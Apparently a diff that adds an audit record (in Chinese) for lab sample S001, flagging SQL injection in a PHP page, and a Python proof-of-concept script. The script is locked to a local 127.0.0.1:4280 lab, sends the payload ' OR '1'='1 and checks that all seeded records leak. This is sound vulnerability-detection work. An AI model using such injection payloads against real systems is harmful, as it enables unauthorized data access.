@@ -1,0 +1,104 @@
+```json
+{"sample_id":"S001","prediction":"vulnerable","vulnerability_type":"SQL注入","locations":["F01:0007","F01:0010","F01:0011","F01:0012"],"evidence":{"source":"F01:0007 从 GET 参数 name 读取外部输入，默认空字符串。","flow":"F01:0010 将 $name 直接拼接进单引号包裹的 SQL 字符串；F01:0011 调用 $db->query($sql) 执行；F01:0012 读取并后续展示结果。","guard":"无效：未使用预处理绑定参数，未对 $name 做 mysqli_real_escape_string、白名单或类型限制，动态内容进入 SQL 字符串字面量。","sink":"F01:0011 的 $db->query($sql) 是可达 SQL 执行点，F01:0010 的拼接语句可被外部输入改变布尔条件。"},"prerequisites":["PHP + MariaDB 服务运行在 127.0.0.1:4280","入口 /lab_cases/S001/index.php 可访问且无需登录","common/db_connect.php 能提供已连接的 mysqli 变量 $db","lab_people 表存在并预置 1 Alice、2 Bob、3 Carol"],"missing_context":["common/db_connect.php 的具体实现未在输入包中提供；不影响当前入口到查询执行点的可达性判断，但复现失败时需检查连接配置","未提供数据库错误显示配置；不过查询成功时结果会在 HTML 正文展示，可用于本地对照验证"],"poc_generated":true,"poc_language":"python3","poc_instructions":"将脚本保存为 poc_s001.py 后运行 python3 poc_s001.py。脚本固定目标为 http://127.0.0.1:4280/lab_cases/S001/index.php，禁用代理并拒绝重定向。普通请求使用 name=Alice，预期解析到业务记录集合 {(1,Alice)}；测试请求使用 name=' OR '1'='1，预期解析到 {(1,Alice),(2,Bob),(3,Carol)}，两者都不修改数据库。观察者为本地 HTTP 响应解析后的页面记录；失败时检查 4280 服务、common/db_connect.php、$db 连接、lab_people 预置数据及 PHP 错误日志。"}
+```
+
+```python
+#!/usr/bin/env python3
+import re
+import sys
+import urllib.error
+import urllib.parse
+import urllib.request
+from html.parser import HTMLParser
+
+BASE = "http://127.0.0.1:4280/lab_cases/S001/index.php"
+
+parsed = urllib.parse.urlparse(BASE)
+if parsed.scheme != "http" or parsed.hostname != "127.0.0.1" or parsed.port != 4280:
+    raise SystemExit("目标必须固定为 http://127.0.0.1:4280")
+
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        raise urllib.error.HTTPError(
+            req.full_url, code, "redirect refused", headers, fp
+        )
+
+OPENER = urllib.request.build_opener(
+    urllib.request.ProxyHandler({}),
+    NoRedirect(),
+)
+
+class Parser(HTMLParser):
+    def __init__(self):
+        super().__init__()
+        self.in_p = False
+        self.buf = []
+        self.texts = []
+
+    def handle_starttag(self, tag, attrs):
+        if tag.lower() == "p":
+            self.in_p = True
+            self.buf = []
+
+    def handle_endtag(self, tag):
+        if tag.lower() == "p" and self.in_p:
+            self.texts.append("".join(self.buf).strip())
+            self.in_p = False
+
+    def handle_data(self, data):
+        if self.in_p:
+            self.buf.append(data)
+
+def parse_records(html_text):
+    p = Parser()
+    p.feed(html_text)
+    records = set()
+    for text in p.texts:
+        m = re.match(r"^ID\s+(\d+)[：:]\s*(.*)$", text)
+        if m:
+            records.add((m.group(1), m.group(2).strip()))
+    return records
+
+def fetch(name_value):
+    query = urllib.parse.urlencode({"name": name_value})
+    url = BASE + "?" + query
+    req = urllib.request.Request(
+        url,
+        headers={"User-Agent": "S001-audit-poc"},
+    )
+    try:
+        with OPENER.open(req, timeout=5) as resp:
+            body = resp.read().decode("utf-8", "replace")
+    except urllib.error.HTTPError as exc:
+        raise SystemExit("HTTP 错误或重定向被拒绝，状态码: %s" % exc.code)
+    except Exception as exc:
+        raise SystemExit("请求失败: %s" % exc)
+    return parse_records(body)
+
+def main():
+    normal = fetch("Alice")
+    payload = "' OR '1'='1"
+    test = fetch(payload)
+
+    expected_normal = {("1", "Alice")}
+    expected_test = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}
+
+    print("普通请求记录:", sorted(normal))
+    print("测试请求记录:", sorted(test))
+
+    if normal != expected_normal:
+        raise SystemExit(
+            "普通请求断言失败，预期 %s，实际 %s"
+            % (sorted(expected_normal), sorted(normal))
+        )
+    if test != expected_test:
+        raise SystemExit(
+            "测试请求断言失败，预期 %s，实际 %s"
+            % (sorted(expected_test), sorted(test))
+        )
+
+    print("PASS: 普通请求仅返回 Alice；测试请求返回全部预置记录。")
+
+if __name__ == "__main__":
+    main()
+```
